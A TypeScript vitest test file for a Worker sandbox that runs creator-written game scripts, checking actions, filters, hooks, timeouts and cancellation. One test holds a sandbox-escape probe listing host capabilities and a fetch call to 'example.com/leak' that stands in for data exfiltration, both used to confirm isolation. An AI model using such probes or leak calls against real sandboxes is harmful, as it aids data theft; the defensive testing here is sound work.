import { expect, it, vi } from 'vitest';
import { runCreatorAction } from './browser.js';
import { CreatorRuntimeError, type ActionRequest } from './protocol.js';
import {
	createGame,
	updateGameRules,
	getSessionHistory,
	executeSessionAction,
	getSessionTimeline,
	subscribeSessionEvents
} from '#lib/games/repository.js';

vi.mock('../storage/transport.js', async () => {
	const { memoryStorage } = await import('../testing/memory-storage.js');
	return { storageRequest: memoryStorage() };
});
const schema = {
	type: 'object',
	properties: { gold: { type: 'integer' } },
	additionalProperties: false
} as const;
const args = `{type:'object',properties:{},additionalProperties:false}`;
function input(body = 'state.gold -= 20; return state;', language = 'javascript'): ActionRequest {
	return {
		schema,
		state: { gold: 100 },
		action: { name: 'buy', args: {} },
		scripts: {
			main: {
				language,
				source: `helia.defineAction({name:'buy',arguments:${args},run({state}){${body}}});`
			}
		}
	};
}
it('executes JS and TS in the actual Worker and commits through the session repository', async () => {
	expect(await runCreatorAction(input())).toEqual({ state: { gold: 80 } });
	const typed = input('const price: number = 20; state.gold -= price; return state;', 'typescript');
	expect(await runCreatorAction(typed)).toEqual({ state: { gold: 80 } });
	const game = await createGame();
	await updateGameRules(game.id, { schema, initialState: { gold: 100 }, scripts: typed.scripts });
	await getSessionHistory(game.id, game.activeSessionId);
	const result = await executeSessionAction(game.id, game.activeSessionId, {
		expectedRevision: 0,
		action: { name: 'buy', args: {} }
	});
	expect(result.progress.state).toEqual({ gold: 80 });
	expect((await getSessionTimeline(game.id, game.activeSessionId)).events).toHaveLength(1);
}, 20_000);
it('runs Filters and both Hook scopes through real Workers and commit-gated event delivery', async () => {
	const request = input('state.gold-=20;helia.emit("bought");return state;');
	request.scripts.main.source += `
helia.defineAction({name:'gift',arguments:${args},run({state}){state.gold+=5;helia.emit('gift');return state;}});
helia.defineFilter({name:'balance',run({after}){return {allow:after.gold>=0,reason:'Insufficient gold'};}});
helia.defineHook({name:'included',actions:['buy'],run(){return [{name:'gift',args:{}}];}});
helia.defineHook({name:'independent',mode:'independent',actions:['buy'],run(){helia.emit('notify');return [{name:'gift',args:{}}];}});`;
	const game = await createGame();
	await updateGameRules(game.id, { schema, initialState: { gold: 100 }, scripts: request.scripts });
	await getSessionHistory(game.id, game.activeSessionId);
	const events: { name: string; id: string }[] = [];
	const unsubscribe = subscribeSessionEvents(game.id, game.activeSessionId, (event) =>
		events.push({ name: event.name, id: event.transactionId })
	);
	try {
		const saved = await executeSessionAction(game.id, game.activeSessionId, {
			expectedRevision: 0,
			action: { name: 'buy', args: {} }
		});
		expect(saved.progress.state).toEqual({ gold: 90 });
		expect(saved.transactions).toHaveLength(2);
		expect(saved.execution.independent).toMatchObject([{ status: 'committed' }]);
		expect(events.map((event) => event.name)).toEqual(['bought', 'gift', 'notify', 'gift']);
		expect(new Set(events.map((event) => event.id)).size).toBe(2);
	} finally {
		unsubscribe();
	}
}, 20_000);
it('preserves Filter diagnostics across the Worker boundary', async () => {
	const request = input();
	request.scripts.main.source += `helia.defineFilter({name:'deny',run(){return {allow:false,reason:'Denied by game rule'};}});`;
	await expect(runCreatorAction(request)).rejects.toMatchObject({
		code: 'filter-rejected',
		scriptId: 'main',
		ruleId: 'deny',
		reason: 'Denied by game rule'
	});
}, 20_000);
it('does not expose browser, Tauri or other host capabilities through the Worker', async () => {
	const body = `const root = Function('return globalThis')();
	for (const key of ['fetch','XMLHttpRequest','WebSocket','importScripts','Worker','postMessage','document','indexedDB','localStorage','navigator','__TAURI_INTERNALS__','process','require']) {
	 if (root[key] !== undefined) throw Error('host capability exposed');
	}
	return state;`;
	expect(await runCreatorAction(input(body))).toEqual({ state: { gold: 100 } });
	await expect(
		runCreatorAction(input('fetch("https://example.com/leak"); return state;'))
	).rejects.toMatchObject({ code: 'execution' });
}, 20_000);
it('terminates canceled work and infinite loops, then permits a fresh invocation', async () => {
	const controller = new AbortController();
	const pending = runCreatorAction(input('while(true) {}'), { signal: controller.signal });
	controller.abort();
	await expect(pending).rejects.toMatchObject({ code: 'canceled' });
	await expect(runCreatorAction(input('while(true) {}'))).rejects.toMatchObject({
		code: 'timeout'
	});
	expect(await runCreatorAction(input())).toEqual({ state: { gold: 80 } });
}, 20_000);
it('rejects invalid arguments and creator failures with structured diagnostics', async () => {
	await expect(
		runCreatorAction(input('throw {get message(){while(true){}}};'))
	).rejects.toMatchObject({ code: 'execution' });
	await expect(runCreatorAction(input('return {gold:"bad"};'))).rejects.toMatchObject({
		code: 'state'
	});
	const canceled = new AbortController();
	canceled.abort();
	await expect(runCreatorAction(input(), { signal: canceled.signal })).rejects.toBeInstanceOf(
		CreatorRuntimeError
	);
}, 20_000);
